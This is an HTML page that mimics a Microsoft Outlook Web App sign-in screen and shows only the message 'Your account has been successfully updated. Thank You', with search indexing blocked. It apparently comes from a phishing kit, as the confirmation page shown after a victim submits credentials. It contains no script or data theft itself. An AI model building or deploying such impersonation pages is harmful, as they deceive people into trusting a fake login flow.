<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="Robots" content="NOINDEX, NOFOLLOW">
    <title>Outlook</title>
    <link rel="shortcut icon" href="icon.png" type="image/x-icon">
    <style>
        @font-face {
            font-family: "wf_segoe-ui_normal";
            src: url("/owa/auth/15.1.2507/themes/resources/segoeui-regular.eot?#iefix") format("embedded-opentype"),
                 url("/owa/auth/15.1.2507/themes/resources/segoeui-regular.ttf") format("truetype");
        }

        @font-face {
            font-family: "wf_segoe-ui_semilight";
            src: url("/owa/auth/15.1.2507/themes/resources/segoeui-semilight.eot?#iefix") format("embedded-opentype"),
                 url("/owa/auth/15.1.2507/themes/resources/segoeui-semilight.ttf") format("truetype");
        }

        @font-face {
            font-family: "wf_segoe-ui_semibold";
            src: url("/owa/auth/15.1.2507/themes/resources/segoeui-semibold.eot?#iefix") format("embedded-opentype"),
                 url("/owa/auth/15.1.2507/themes/resources/segoeui-semibold.ttf") format("truetype");
        }

        body.rtl { text-align: right; direction: rtl; }
        body, .mouse, .twide, .tnarrow, form { height: 100%; width: 100%; margin: 0px; }
        .mouse, .twide { min-width: 650px; min-height: 650px; position: absolute; top: 0px; bottom: 0px; left: 0px; right: 0px; }
        .sidebar { background-color: #0072C6; }
        .mouse .sidebar, .twide .sidebar { position: absolute; top: 0px; bottom: 0px; left: 0px; display: inline-block; width: 332px; }
        .tnarrow .sidebar { display: none; }
        .mouse .owaLogoContainer, .twide .owaLogoContainer { margin: 213px auto auto 109px; text-align: left; }
        .tnarrow .owaLogo { display: none; }
        .mouse .owaLogoSmall, .twide .owaLogoSmall { display: none; }
        .logonDiv { text-align: left; }
        .rtl .logonDiv { text-align: right; }
        .mouse .logonContainer, .twide .logonContainer { padding-top: 174px; padding-left: 464px; padding-right: 142px; position: absolute; top: 0px; bottom: 0px; left: 0px; right: 0px; text-align: center; }
        .mouse .logonDiv, .twide .logonDiv { position: relative; vertical-align: top; display: inline-block; width: 423px; }
        .tnarrow .logonDiv { margin: 25px auto auto -130px; position: absolute; left: 50%; width: 260px; padding-bottom: 20px; }
        .twide .signInImageHeader, .tnarrow .signInImageHeader { display: none; }
        .mouse .signInImageHeader { margin-bottom: 22px; }
        .twide .mouseHeader { display: none; }
        .mouse .twideHeader { display: none; }

        .signInInputLabel {
            font-size: 12px;
            color: #666666;
            font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        }

        .signInBg { margin: 0px; }
    </style>
</head>
<body class="signInBg" style="background: #f2f2f2 url('linelogo.png') repeat-x">

    <div id="mainLogonDiv" class="mouse">
        <div class="sidebar">
            <div class="owaLogoContainer">
                <img src="waologo.png" class="owaLogo" aria-hidden="true">
                <img src="waologosmall.png" class="owaLogoSmall" aria-hidden="true">
            </div>
        </div>
        <div class="logonContainer">
            <div id="lgnDiv" class="logonDiv">
                <div class="signInImageHeader" role="heading" aria-label="Outlook">
                    <img class="mouseHeader" src="oLogo.png" alt="Outlook">
                </div>
                &nbsp;
                <div class="signInInputLabel" aria-hidden="true">
                    <p style="color:#0072c6;">Your account has been successfully updated.</p>
                    <p>Thank You</p>
                    &nbsp;
                </div>
            </div>
        </div>
    </div>
</body>
</html>
